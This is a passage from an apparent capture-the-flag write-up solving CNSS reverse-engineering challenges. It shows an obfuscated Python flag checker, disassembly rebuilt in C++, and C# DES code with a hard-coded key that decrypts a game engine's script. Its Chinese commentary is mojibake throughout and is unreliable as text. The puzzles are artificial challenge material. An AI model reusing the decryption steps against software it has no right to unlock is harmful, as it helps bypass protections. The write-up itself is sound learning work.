[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~(((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~(((~((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))]</span><br><span class="line">flag = input(&quot;flag: &quot;)</span><br><span class="line">if len(flag) == 31:</span><br><span class="line">	for i in range(len(flag)):</span><br><span class="line">		if (ord(flag[i])^((~((~(((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))!=x[i]:</span><br><span class="line">			print(&quot;Wrong&quot;)</span><br><span class="line">			exit()</span><br><span class="line">	print(&quot;Correct&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;Wrong&quot;)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæŒºæœ‰æ„æ€çš„[]&lt;[]äº§ç”Ÿä¸€ä¸ª0ç„¶åç”¨å„ç§ä½è¿ç®—ã€‚åªéœ€è¦x[]å¼‚æˆ–ä¸Šifåˆ¤æ–­ä¸­çš„</p>
<p>((<del>((</del>(((-<del>([]&lt;[]))&lt;&lt;(-</del>([]&lt;[]))))&lt;&lt;(-<del>([]&lt;[]))))&lt;&lt;(-</del>([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))ç„¶åchrè¾“å‡ºå°±æ‹¿åˆ°flagäº†</p>
<h2 id="Mid-diannaobaozhale"><a href="#Mid-diannaobaozhale" class="headerlink" title="[Mid] diannaobaozhale"></a>[Mid] diannaobaozhale</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">main            proc near</span><br><span class="line"></span><br><span class="line">var_5           = byte ptr -5</span><br><span class="line">var_4           = dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">        endbr64</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 10h</span><br><span class="line">        mov     [rbp+var_5], 63</span><br><span class="line">        mov     edi, 63h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 6Eh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 73h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 73h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 7Bh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     [rbp+var_4], 0</span><br><span class="line">        jmp     short loc_11B0</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_1194:</span><br><span class="line">        movsx   eax, [rbp+var_5]</span><br><span class="line">        mov     edi, eax        ;</span><br><span class="line">        call    _putchar</span><br><span class="line">        movzx   eax, [rbp+var_5]</span><br><span class="line">        add     eax, 2</span><br><span class="line">        xor     eax, 1</span><br><span class="line">        mov     [rbp+var_5], al</span><br><span class="line">        add     [rbp+var_4], 1</span><br><span class="line"></span><br><span class="line">loc_11B0:</span><br><span class="line">        cmp     [rbp+var_4], 9</span><br><span class="line">        jle     short loc_1194</span><br><span class="line">        mov     edi, 7Dh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        retn</span><br><span class="line">; &#125;</span><br><span class="line">main            endp</span><br></pre></td></tr></table></figure>

<p>__putcharè¾“å‡ºå­—ç¬¦</p>
<p>63h 6Eh 73h 73h 7Bh å¯¹åº”cnss{ </p>
<p>cmp  [rbp+var_4], 9 jle     short loc_1194ä»¥åŠadd     [rbp+var_4], 1</p>
<p>å°±æ˜¯ä¸€ä¸ªä¹æ¬¡çš„å¾ªç¯</p>
<p>7Dhå¯¹åº” }</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">	<span class="type">char</span> rbpvar5 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">putchar</span>(rbpvar5);</span><br><span class="line">		rbpvar5 += <span class="number">2</span>; rbpvar5 ^= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag cnss{cdghklopst}</p>
<h2 id="Hard-Shino-çš„å¿ƒè·³å¤§å†’é™©"><a href="#Hard-Shino-çš„å¿ƒè·³å¤§å†’é™©" class="headerlink" title="[Hard] Shino çš„å¿ƒè·³å¤§å†’é™©"></a>[Hard] Shino çš„å¿ƒè·³å¤§å†’é™©</h2><p>ç©äº†ä¸€ä¸‹å‘ç°flagè¢«æŒ¡ä½äº†ï¼Œçœ‹ç›®å½•é‡Œé¢æœ‰å¥½å‡ ä¸ªYuriå…³é”®è¯ï¼Œæœç´¢äº†ä¸€ä¸‹å‘ç°</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rinkako/YuriAVGEngine%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE">https://github.com/rinkako/YuriAVGEngineè¿™ä¸ªé¡¹ç›®</a></p>
<p>çœ‹äº†ä¸‹ç®€æ´è¿™ä¸ªæ¸¸æˆå¼•æ“æ˜¯åŸºäºè™šæ‹Ÿæœºçš„ï¼Œæœ‰ä¸ªmain.silæ˜¯å­˜æ”¾æ¸¸æˆé€»è¾‘çš„ä¸­é—´ç çš„ï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ï¼Œåƒæ˜¯base64åŠ å¯†ï¼Œç”¨åœ¨çº¿çš„base64è§£å¯†å‘ç°ä¹±ç </p>
<p>ç»§ç»­ç¿»é¡¹ç›®ï¼Œå‘ç°æœ‰ä¸ªyuriricliæ˜¯ç”¨æ¥ç¼–è¯‘é¡¹ç›®çš„ï¼Œä¸‹è½½æºç çœ‹çœ‹é‡Œé¢æ˜¯æ€ä¹ˆåŠ å¯†çš„</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Yuri.YuriInterpreter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> åŠ å¯†è§£å¯†ç±»</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">YuriEncryptor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²åšDESåŠ å¯†</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;data&quot;&gt;</span>è¦åŠ å¯†çš„æ•°æ®<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;key&quot;&gt;</span>ç§é’¥<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>åŠ å¯†å®Œæ¯•çš„å­—ç¬¦ä¸²<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">EncryptString</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(data))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> str;</span><br><span class="line">            &#125;</span><br><span class="line">            MemoryStream ms = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="built_in">byte</span>[] myKey = Encoding.UTF8.GetBytes(key);</span><br><span class="line">            <span class="built_in">byte</span>[] myIV = &#123; <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x78</span>, <span class="number">0x90</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0xEF</span> &#125;;</span><br><span class="line">            DES myProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            CryptoStream cs = <span class="keyword">new</span> CryptoStream(ms, myProvider.CreateEncryptor(myKey, myIV), CryptoStreamMode.Write);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] bs = Encoding.UTF8.GetBytes(data);</span><br><span class="line">                cs.Write(bs, <span class="number">0</span>, bs.Length);</span><br><span class="line">                cs.FlushFinalBlock();</span><br><span class="line">                str = Convert.ToBase64String(ms.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                cs.Close();</span><br><span class="line">                ms.Close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²åšDESè§£å¯†</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;data&quot;&gt;</span>è¦è§£å¯†çš„æ•°æ®<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;key&quot;&gt;</span>ç§é’¥<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>è§£å¯†å®Œæ¯•çš„å­—ç¬¦ä¸²<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">DecryptString</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(data))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;data is empty&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MemoryStream ms = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="built_in">byte</span>[] myKey = Encoding.UTF8.GetBytes(key);</span><br><span class="line">            <span class="built_in">byte</span>[] myIV = &#123; <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x78</span>, <span class="number">0x90</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0xEF</span> &#125;;</span><br><span class="line">            DES myProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            CryptoStream cs = <span class="keyword">new</span> CryptoStream(ms, myProvider.CreateDecryptor(myKey, myIV), CryptoStreamMode.Write);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] bs = Convert.FromBase64String(data);</span><br><span class="line">                cs.Write(bs, <span class="number">0</span>, bs.Length);</span><br><span class="line">                cs.FlushFinalBlock();</span><br><span class="line">                str = Encoding.UTF8.GetString(ms.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                cs.Close();</span><br><span class="line">                ms.Close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯desåŠ å¯†çš„ï¼Œä¸‹é¢è¿˜æœ‰è§£å¯†å‡½æ•°ï¼Œå°±åœ¨çª—å£loadé‚£è°ƒç”¨äº†ä¸€ä¸‹</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CPMainForm_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    String path = <span class="string">&quot;D:\\dw_file\\cnss\\CNSS Rev Challenge\\Scenario\\main.sil&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> encryptedData <span class="keyword">in</span> File.ReadLines(path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> key = <span class="string">&quot;yurayuri&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> decryptedData = YuriEncryptor.DecryptString(encryptedData, key);</span><br><span class="line">        Console.WriteLine(decryptedData);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£å¯†å‡ºæ¥çš„æ–‡æœ¬æ˜¯è¿™æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">main_0@NOP^^^^main_0@act_bgm#main_1@act_bg#main_2@act_se#main_4@act_dialog#main_6@act_cstand#main_7@act_se#main_9@act_dialog#main_11@act_deletecstand#main_12@act_se#main_14@act_dialog#main_16@act_se#main_18@act_dialog#main_20@act_stopbgm#main_21@act_cstand#main_22@act_se#main_24@act_dialog#main_26@act_bgm#main_27@act_se#main_29@act_dialog#main_31@act_se#main_33@act_dialog#main_35@act_se#main_37@act_dialog#main_39@act_deletecstand#main_40@act_bg#main_41@act_se#main_43@act_dialog#main_45@act_se#main_47@act_dialog#main_49@act_se#main_51@act_dialog#main_53@act_se#main_55@act_dialog#main_57@act_se#main_59@act_dialog#main_61@act_se#main_63@act_dialog#main_65@act_se#main_66@act_bg#main_67@act_wait#main_68@act_bg#main_69@act_cstand#main_71@act_dialog#main_73@act_deletecstand#main_74@act_se#main_75@act_bg#main_76@act_wait#main_77@act_se#main_78@act_bg#main_79@act_wait#main_80@act_bg#main_81@act_stopbgm#main_82@act_cstand#main_83@act_se#main_85@act_dialog#main_87@act_bg#main_88@act_bgm#main_89@act_deletecstand#main_90@act_cstand#main_91@act_se#main_93@act_dialog#main_95@act_se#main_97@act_dialog#main_99@act_se#main_101@act_dialog#main_103@act_se#main_105@act_dialog#main_107@act_se#main_109@act_dialog#main_111@act_se#main_113@act_dialog#main_115@act_se#main_117@act_dialog#main_119@act_se#main_121@act_dialog#main_123@act_se#main_125@act_dialog#main_127@act_se#main_129@act_dialog#main_131@act_deletecstand#main_132@act_picture#main_133@act_se#main_135@act_dialog#main_137@act_se#main_139@act_dialog#main_142@act_dialog#main_144@act_deletepicture#main_145@act_se#main_147@act_dialog#main_150@act_dialog#main_152@act_shutdown^^0^^109097105110</span><br><span class="line">main_0@act_bgm^filename@050053046109112051#vol@052057056^^main_1@act_bg^^^0^^048045048</span><br><span class="line">main_1@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_2@act_se^^^0^^049045048</span><br><span class="line">main_2@act_se^filename@121117107117109111095048048048049046109112051#vol@056048048^^main_4@act_dialog^^^0^^050045048</span><br><span class="line">main_4@act_dialog^^^main_6@act_cstand^^^0^^083104105110111058227128142230136145229143171032083104105110111239188140230152175228184128229144141229136154229136154229133165229173166231148181229173144231165158230138128229164167229173166231154132232174161231174151230156186229176143231153189227128130227128143013010035048</span><br><span class="line">main_6@act_cstand^id@048#name@083104105110111#face@049#x@049051048#y@049051048#loc@^^main_7@act_se^^^0^^054045048</span><br><span class="line">main_7@act_se^filename@121117107117109111095048048048050046109112051#vol@056048048^^main_9@act_dialog^^^0^^055045048</span><br><span class="line">main_9@act_dialog^^^main_11@act_deletecstand^^^0^^083104105110111058032227128142232191153230152175230136145239188140233149191231155184232141137231142135239188140228189134229175140230156137231165158231167152230132159227128130227128143013010035048</span><br><span class="line">main_11@act_deletecstand^id@048^^main_12@act_se^^^0^^049049045048</span><br><span class="line">main_12@act_se^filename@121117107117109111095048048048051046109112051#vol@056048048^^main_14@act_dialog^^^0^^049050045048</span><br><span class="line">main_14@act_dialog^^^main_16@act_se^^^0^^083104105110111058032227128142231142176229156168230136145230173163231171153229156168230160161233151168229143163227128130228187164228186186229144145229190128231154132229164167229173166231148159230180187230136145230157165229149166239188129227128143013010035048</span><br><span class="line">main_16@act_se^filename@121117107117109111095048048048052046109112051#vol@056048048^^main_18@act_dialog^^^0^^049054045048</span><br><span class="line">main_18@act_dialog^^^main_20@act_stopbgm^^^0^^083104105110111058032227128142231173137231173137239188140233130163230152175228187128228185136239188159227128143013010035048</span><br><span class="line">main_20@act_stopbgm^^^main_21@act_cstand^^^0^^050048045048</span><br><span class="line">main_21@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_22@act_se^^^0^^050049045048</span><br><span class="line">main_22@act_se^filename@121117107117109111095048048048053046109112051#vol@056048048^^main_24@act_dialog^^^0^^050050045048</span><br><span class="line">main_24@act_dialog^^^main_26@act_bgm^^^0^^083104105110111058032227128142231156139232181183230157165230156137231130185229131143046046046046230136145232135170229183177239188159227128143013010035048</span><br><span class="line">main_26@act_bgm^filename@050057046109112051#vol@053048050^^main_27@act_se^^^0^^050054045048</span><br><span class="line">main_27@act_se^filename@121117107117109111095048048048054046109112051#vol@056048048^^main_29@act_dialog^^^0^^050055045048</span><br><span class="line">main_29@act_dialog^^^main_31@act_se^^^0^^239188159239188159239188159239188154227128142229141131228184135232166129229176143229191131046046046227128143013010035048</span><br><span class="line">main_31@act_se^filename@121117107117109111095048048048055046109112051#vol@056048048^^main_33@act_dialog^^^0^^051049045048</span><br><span class="line">main_33@act_dialog^^^main_35@act_se^^^0^^239188159239188159239188159239188154227128142232191155229133165230160161229155173229144142239188140229143175232131189228188154230156137228184128228184170229165135230128170231154132229165179228186186230137190228184138228189160227128130227128143013010035048</span><br><span class="line">main_35@act_se^filename@121117107117109111095048048048056046109112051#vol@056048048^^main_37@act_dialog^^^0^^051053045048</span><br><span class="line">main_37@act_dialog^^^main_39@act_deletecstand^^^0^^239188159239188159239188159239188154227128142229165185230136180231157128231187191232137178229184189229173144239188140228184128229164180231153189229143145227128130232153189231132182231156139232181183230157165229190136229143175231136177239188140228189134229133182229174158232131140229144142230156137228184128228184170229188186229164167231154132231165158231167152231187132231187135227128130227128143013010035048</span><br><span class="line">main_39@act_deletecstand^id@048^^main_40@act_bg^^^0^^051057045048</span><br><span class="line">main_40@act_bg^id@049#filename@067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_41@act_se^^^0^^052048045048</span><br><span class="line">main_41@act_se^filename@121117107117109111095048048048057046109112051#vol@056048048^^main_43@act_dialog^^^0^^052049045048</span><br><span 